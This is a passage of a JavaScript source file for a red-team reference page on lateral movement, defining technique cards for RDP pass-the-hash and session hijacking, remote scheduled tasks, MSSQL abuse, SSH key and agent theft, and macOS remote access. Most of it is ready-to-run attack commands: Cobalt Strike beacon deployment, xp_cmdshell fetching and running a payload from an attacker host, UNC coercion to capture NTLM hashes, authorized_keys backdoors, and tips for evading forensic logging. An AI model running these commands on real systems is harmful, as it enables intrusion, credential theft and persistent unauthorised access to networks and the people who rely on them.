xfreerdp /v:TARGET /u:CORP\\Administrator /pth:NTLM_HASH /d:corp.local /cert:ignore

# PTH via mstsc /restrictedadmin (Windows — with injected hash)
# 1. inject hash with Cobalt Strike pth, then:
shell mstsc /v:TARGET /restrictedadmin

# Kerberos RDP (pass-the-ticket)
# After injecting TGT with Rubeus ptt:
execute-assembly /tools/Rubeus.exe ptt /ticket:<BASE64_TGT>
shell mstsc /v:TARGET.corp.local   # Uses injected Kerberos ticket

# --- RDP SESSION HIJACKING (tscon — no password needed) ---
# Step 1: List sessions on target (requires network access or local access)
shell qwinsta /server:TARGET        # Query sessions
shell query session /server:TARGET  # Alternative

# Step 2: Identify disconnected sessions (State = Disc)
# Example output:
# SESSIONNAME  USERNAME    ID  STATE
# console      john.smith  2   Disc   <-- hijackable

# Step 3: Escalate to SYSTEM on target (required for tscon cross-session)
# From a beacon on the target as local admin:
steal_token <SYSTEM_PID>     # or use Potato to get SYSTEM token
# Then:
shell tscon 2 /dest:rdp-tcp#0   # Attach session 2 to current RDP connection
# john.smith's session now appears on your RDP screen with no password

# --- SHARPRDP — commandless RDP execution ---
# Executes commands on remote host via RDP without opening GUI
execute-assembly /tools/SharpRDP.exe computername=TARGET command="cmd /c C:\\Windows\\Temp\\beacon.exe" username=CORP\\Administrator password=Password123
# Or with hash (if Restricted Admin enabled on target):
execute-assembly /tools/SharpRDP.exe computername=TARGET command="cmd /c beacon.exe" takeover

# --- SCAN FOR RDP TARGETS ---
nxc rdp 10.10.10.0/24                        # Check open RDP
nxc rdp 10.10.10.0/24 -u Administrator -H :NTLM_HASH   # Test PTH
nxc rdp 10.10.10.0/24 --screenshot          # Take screenshots of all sessions`
      }
    ]
  },
  {
    id: 'schtasks-lateral',
    title: 'Scheduled Task Remote Execution',
    subtitle: 'Create and execute remote scheduled tasks for lateral movement with minimal forensic artefacts',
    tags: ['schtasks', 'atexec', 'impacket', 'Task Scheduler', 'remote task', 'event 4698', 'SharpTask'],
    accentColor: 'orange',
    overview: `Remote scheduled tasks provide a clean lateral movement path that doesn't require creating a Windows service (unlike PsExec) and uses a different execution chain than WMI. Tasks are created via the Task Scheduler RPC interface (port 135 + ephemeral) or ATSVC pipe.

Artefact profile:
- EventID 4698: Scheduled task created — logged on target
- EventID 4702: Task updated; 4699: Task deleted — clean up creates these
- Task XML stored in: C:\\Windows\\System32\\Tasks\\ (forensic artefact even after deletion)
- Prefer: randomised task name, single execution, immediate delete after callback

Impacket atexec provides fire-and-forget command execution. netexec --exec-method atexec runs it at scale. On-prem from a beacon, the combination of schtasks /create → /run → /delete achieves the same with token control.`,
    steps: [
      'REMOTE (atexec): impacket-atexec — creates task, runs it, reads output via C$, deletes task — single shot',
      'REMOTE (netexec): nxc smb --exec-method atexec for scale across subnets with PTH/Kerberos',
      'ON-PREM: schtasks /create /s TARGET — requires token with admin rights on target',
      'Use /ST 00:00 /SC ONCE for one-time immediate execution (specify time in past for instant trigger)',
      'Cleanup: always /delete the task after execution to reduce forensic artefacts',
      'Task XML artefact: even deleted tasks may leave XML in C:\\Windows\\System32\\Tasks\\',
    ],
    commands: [
      {
        title: 'Remote scheduled task lateral movement',
        code: `# --- IMPACKET-ATEXEC (from Linux) ---
# Fire a single command — creates task, runs, reads output, deletes
impacket-atexec corp.local/Administrator:Password@TARGET "whoami /all"
impacket-atexec corp.local/Administrator@TARGET "cmd /c C:\\Windows\\Temp\\beacon.exe" -hashes :NTLM_HASH

# Kerberos:
export KRB5CCNAME=Administrator.ccache
impacket-atexec -k -no-pass TARGET.corp.local "cmd /c beacon.exe"

# --- NETEXEC AT SCALE ---
nxc smb 10.10.10.0/24 -u Administrator -H :NTLM_HASH --exec-method atexec -x "whoami"
nxc smb 10.10.10.0/24 -u Administrator -H :NTLM_HASH --local-auth --exec-method atexec -x "net localgroup administrators"

# --- ON-PREM (from Cobalt Strike beacon) ---
# Step 1: Establish token with admin rights on target
make_token CORP\\Administrator Password123

# Step 2: Create scheduled task on remote host
shell schtasks /create /s TARGET /tn "WindowsBackup" /tr "C:\\Windows\\Temp\\beacon.exe" /sc ONCE /st 00:00 /ru SYSTEM /f

# Step 3: Run it immediately
shell schtasks /run /s TARGET /tn "WindowsBackup"

# Step 4: Cleanup (delete after beacon calls back)
shell schtasks /delete /s TARGET /tn "WindowsBackup" /f

rev2self

# --- POWERSHELL REMOTING TASK CREATION ---
$cred = New-Object PSCredential("CORP\\Administrator", (ConvertTo-SecureString "Pass" -AsPlainText -Force))
Invoke-Command -ComputerName TARGET -Credential $cred -ScriptBlock {
    $action = New-ScheduledTaskAction -Execute "C:\\Windows\\Temp\\beacon.exe"
    $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(5)
    Register-ScheduledTask -TaskName "WindowsUpdate2" -Action $action -Trigger $trigger -RunLevel Highest
    Start-ScheduledTask -TaskName "WindowsUpdate2"
    Start-Sleep 10
    Unregister-ScheduledTask -TaskName "WindowsUpdate2" -Confirm:$false
}

# --- DETECT ARTEFACTS LEFT BEHIND ---
# Task XML files in System32\Tasks remain even after deletion on some Windows versions
shell dir C:\\Windows\\System32\\Tasks\\ /s /b
# Look for: recently created XML files matching your task name`
      }
    ]
  },
  {
    id: 'mssql-lateral',
    title: 'MSSQL Lateral Movement & Privilege Escalation',
    subtitle: 'Abuse MSSQL server links, xp_cmdshell, and impersonation for lateral movement and OS-level execution',
    tags: ['MSSQL', 'xp_cmdshell', 'linked servers', 'sa account', 'PowerUpSQL', 'UNC auth coercion', 'sp_executesql'],
    accentColor: 'blue',
    overview: `MSSQL servers are often overlooked lateral movement vectors. Service accounts running MSSQL frequently have elevated Windows privileges, and SQL Server features enable OS command execution directly from SQL queries.

Attack paths:
1. xp_cmdshell: built-in extended stored procedure that executes OS commands as the SQL service account (often SYSTEM or a domain account with broad permissions)
2. SQL Server Links (Linked Servers): chains of SQL server trust — query one server which queries another using stored credentials, sometimes with SA rights on the linked server even when you only have user rights on the first
3. Impersonation: EXECUTE AS [sa] or EXECUTE AS LOGIN if IMPERSONATE permission granted to your SQL login
4. UNC path coercion: SQL's xp_fileexist or BACKUP TO a UNC path forces NTLM authentication from the SQL service account — relay or capture the hash`,
    steps: [
      'Enumerate MSSQL servers: PowerUpSQL Get-SQLInstanceDomain, netexec mssql, or nmap port 1433',
      'Check permissions: PowerUpSQL Invoke-SQLAudit or manual queries against sys.server_permissions',
      'If SA or sysadmin: enable and use xp_cmdshell for OS command execution',
      'If not SA: check EXECUTE AS permissions for impersonation, or enumerate linked servers',
      'Linked server traversal: if server A links to server B with sa credentials, query B via A to run commands',
      'UNC coercion: EXEC xp_fileexist "\\\\ATTACKER\\share" — forces NTLM auth from SQL service account',
    ],
    commands: [
      {
        title: 'MSSQL lateral movement — PowerUpSQL, xp_cmdshell, linked servers',
        code: `# --- ENUMERATION ---
# PowerUpSQL — comprehensive SQL Server enum
execute-assembly /tools/PowerUpSQL.exe GetSQLInstanceDomain   # Find SQL servers in domain
execute-assembly /tools/PowerUpSQL.exe Invoke-SQLAudit         # Audit all accessible instances
execute-assembly /tools/PowerUpSQL.exe Get-SQLServerLink       # Find linked servers
execute-assembly /tools/PowerUpSQL.exe Get-SQLServerRoleMember # List role members

# From Linux (impacket-mssqlclient):
impacket-mssqlclient corp.local/sqladmin:Password@SQL01
impacket-mssqlclient corp.local/Administrator@SQL01 -hashes :NTLM_HASH
# Kerberos:
export KRB5CCNAME=Administrator.ccache
impacket-mssqlclient -k -no-pass SQL01.corp.local

# --- XP_CMDSHELL ---
# Check if enabled:
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell'

# Enable xp_cmdshell (requires sysadmin):
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

# Execute OS commands:
EXEC xp_cmdshell 'whoami'
EXEC xp_cmdshell 'net localgroup administrators'
EXEC xp_cmdshell 'powershell -nop -w hidden -enc BASE64PAYLOAD'

# Drop and execute beacon:
EXEC xp_cmdshell 'powershell -c "IWR http://ATTACKER/beacon.exe -o C:\\Windows\\Temp\\b.exe; C:\\Windows\\Temp\\b.exe"'

# In impacket-mssqlclient:
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami

# --- IMPERSONATION ---
# Check who you can impersonate:
SELECT distinct b.name FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'

# Impersonate SA and enable xp_cmdshell:
EXECUTE AS LOGIN = 'sa'
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami'

# --- LINKED SERVER TRAVERSAL ---
# List linked servers:
SELECT name, data_source FROM sys.servers WHERE is_linked = 1

# Execute query on linked server:
SELECT * FROM OPENQUERY([LINKED_SERVER_NAME], 'SELECT SYSTEM_USER')
EXEC ('SELECT SYSTEM_USER') AT [LINKED_SERVER_NAME]

# Enable xp_cmdshell on linked server (if SA there):
EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE') AT [LINKED_SERVER]
EXEC ('xp_cmdshell ''whoami''') AT [LINKED_SERVER]

# Traverse multiple hops:
EXEC ('EXEC (''xp_cmdshell ''''whoami'''''') AT [INNER_SERVER]') AT [LINKED_SERVER]

# --- UNC COERCION (capture/relay SQL service account hash) ---
EXEC xp_fileexist '\\\\ATTACKER\\share\\file.txt'
EXEC xp_dirtree '\\\\ATTACKER\\share\\'
# SQL service account NTLM hash captured in Responder / ntlmrelayx
# Or use BACKUP DATABASE to a UNC path:
BACKUP DATABASE master TO DISK = '\\\\ATTACKER\\share\\backup.bak'`
      }
    ]
  },
];

const linuxLateral = [
  {
    id: 'ssh-lateral',
    title: 'SSH Lateral Movement',
    subtitle: 'Abuse SSH keys, agent forwarding, and ProxyJump chains for Linux lateral movement',
    tags: ['SSH', 'authorized_keys', 'ssh-agent hijack', 'ProxyJump', 'known_hosts', 'key reuse'],
    accentColor: 'pink',
    overview: 'SSH lateral movement on Linux/Unix environments relies on three primary mechanisms: private key reuse (one key commonly grants access to many hosts in the same infrastructure), SSH agent hijacking (stealing an existing agent socket allows authentication as the key owner without the key file), and ProxyJump chaining (hopping through bastion hosts without exposing internal addresses). The known_hosts file is a free internal network map — it lists every host the user has ever SSH\'d to.',
    steps: [
      'Collect SSH private keys from compromised hosts — check ~/.ssh/, /root/.ssh/, /etc/ssh/',
      'Check known_hosts for target IPs/hostnames — map internal SSH infrastructure',
      'Key reuse: one key often grants access to many hosts — test across all discovered targets',
      'SSH agent hijacking: if ssh-agent is running, steal its socket to forward auth without the key',
      'ProxyJump: chain SSH connections through intermediate hosts without exposing internal IPs',
      'authorized_keys backdoor: add your public key to maintain persistent access',
    ],
    commands: [
      {
        title: 'SSH lateral movement techniques',
        code: `# Collect SSH keys from compromised host
find / -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" 2>/dev/null
cat ~/.ssh/known_hosts       # List previously connected hosts
cat ~/.ssh/config            # SSH client config — may contain ProxyJump info

# Test key against discovered hosts
chmod 600 id_rsa
for host in $(cat known_hosts | cut -d',' -f1 | awk '{print $1}'); do
  ssh -i id_rsa -o StrictHostKeyChecking=no user@$host whoami 2>/dev/null
done

# SSH agent hijacking
# List other users' ssh-agent sockets
ls /tmp/ssh-*/
# Steal the agent socket
SSH_AUTH_SOCK=/tmp/ssh-XXXXXXX/agent.PID ssh-add -l   # List keys in agent
SSH_AUTH_SOCK=/tmp/ssh-XXXXXXX/agent.PID ssh user@TARGET  # Connect using hijacked agent

# ProxyJump — chain through bastion
ssh -J bastion.corp.local internal-host.corp.local
# In ~/.ssh/config:
Host internal
  HostName 10.10.10.5
  User root
  ProxyJump bastion.corp.local

# Add authorized_keys backdoor
echo "ssh-rsa ATTACKER_PUB_KEY attacker" >> ~/.ssh/authorized_keys
# Or for root (if writable):
echo "ssh-rsa ATTACKER_PUB_KEY attacker" >> /root/.ssh/authorized_keys

# Dynamic SOCKS over SSH
ssh -D 1080 -f -N user@TARGET     # SOCKS5 proxy via SSH tunnel
proxychains nmap -sT -Pn 10.10.10.0/24

# SSH port forwarding
ssh -L 3389:INTERNAL:3389 user@TARGET   # Forward local 3389 to internal RDP
ssh -R 4444:localhost:4444 user@TARGET  # Reverse: expose attacker port 4444`
      }
    ]
  },
];

const macOSLateral = [
  {
    id: 'macos-lateral',
    title: 'macOS Lateral Movement',
    subtitle: 'Move laterally across macOS hosts via ARD, SSH, osascript, and AppleScript',
    tags: ['ARD', 'Apple Remote Desktop', 'osascript', 'AppleScript', 'SSH', 'sharing', 'Screen Sharing'],
    accentColor: 'pink',
    overview: 'macOS lateral movement leverages Apple\'s remote management tools. Apple Remote Desktop (ARD) provides full GUI access. SSH is built into macOS and widely used in enterprise environments. osascript (AppleScript/JXA) executes shell commands without spawning a shell process — it appears as osascript in process lists rather than bash/sh. Screen Sharing over VNC (port 5900) provides GUI access when ARD is enabled. The kickstart binary can re-enable ARD silently if you have root.',
    steps: [
      'Apple Remote Desktop (ARD): if enabled, use `ScreenSharingAgent` or VNC to access other Macs — port 5900',
      'SSH: macOS has SSH built-in — collect keys from ~/.ssh/ and test against other internal Macs',
      'osascript: execute AppleScript or JavaScript for Automation (JXA) — can interact with UI, send keystrokes',
      'Screen Sharing: if enabled in System Preferences, connect via VNC with valid credentials',
      'kickstart (ARD management binary): re-enable ARD silently and add users — requires root',
      'dsh / clush: if cluster SSH tools exist, abuse to run commands across multiple hosts',
    ],
    commands: [
      {
        title: 'macOS lateral movement techniques',
        code: `# Check what remote services are running
sudo launchctl list | grep -E "ssh|vnc|ard|remote"
sudo systemsetup -getremotelogin           # SSH status
sudo systemsetup -getremotedesktopEnabled  # ARD/Screen Sharing

# Apple Remote Desktop — enable silently (root)
sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart \
  -activate -configure -access -on -users admin -privs -all -restart -agent -menu

# SSH lateral movement
ssh -i ~/.ssh/id_rsa user@192.168.1.10
# Collect keys and test against discovered Macs
find /Users -name "id_rsa" -o -name "id_ed25519" 2>/dev/null | while read key; do
  ssh -i "$key" -o StrictHostKeyChecking=no -o ConnectTimeout=3 user@TARGET 2>/dev/null && echo "Works: $key"
done

# osascript — run commands via AppleScript (no shell needed)
osascript -e 'do shell script "whoami"'
osascript -e 'do shell script "/tmp/beacon" with administrator privileges'

# JXA (JavaScript for Automation) — more powerful scripting
osascript -l JavaScript -e 'var app = Application.currentApplication(); app.includeStandardAdditions = true; app.doShellScript("id");'

# Screen Sharing / VNC (port 5900)
# Scan for open VNC on local network
nmap -p 5900 --open 192.168.1.0/24
# Connect:
open vnc://192.168.1.10   # macOS built-in VNC viewer
# Linux:
vncviewer 192.168.1.10:5900

# Abuse Finder/Dock scripting to execute payload
osascript -e 'tell application "Finder" to open POSIX file "/tmp/beacon"'

# Dynamic SOCKS proxy through macOS host
ssh -D 1080 -f -N user@MAC_HOST
proxychains nmap 10.10.10.0/24`
      }
    ]
  },
];

export default function LateralMovement() {
  const scrollTo = (id) => { const el = document.getElementById(id); if (el) el.scrollIntoView({ behavior: 'smooth', block: 'start' }); };
  return (
    <div className="space-y-12">
      <div className="text-center mb-10">
        <h1 className="text-3xl md:text-5xl font-bold font-mono tracking-tight">
          <span className="text-slate-200">Lateral </span><span className="text-pink-400">Movement</span>
        </h1>
        <p className="text-slate-500 font-mono text-sm mt-3">PTH • WinRM • PsExec • WMI • DCOM • macOS ARD • Pivoting</p>
      </div>
      <ArchitectureMap columns={mapColumns} onNodeClick={scrollTo} />
      <div className="border-t border-slate-800/50 pt-10 grid grid-cols-1 gap-4">
        {[
          techniques.find(t => t.id === 'pth'),
          techniques.find(t => t.id === 'winrm'),
          techniques.find(t => t.id === 'rdp-lateral'),
          ...linuxLateral,
          ...macOSLateral,
          techniques.find(t => t.id === 'psexec'),
          techniques.find(t => t.id === 'wmi'),
          techniques.find(t => t.id === 'dcom'),
          techniques.find(t => t.id === 'schtasks-lateral'),
          techniques.find(t => t.id === 'pivoting'),
          techniques.find(t => t.id === 'mssql-lateral'),
        ].map((t) => (
          <div key={t.id} id={t.id}>
            <TechniqueCard title={t.title} subtitle={t.subtitle} tags={t.tags} accentColor={t.accentColor} overview={t.overview} steps={t.steps} commands={t.commands} />
          </div>
        ))}
      </div>
    </div>
  );
}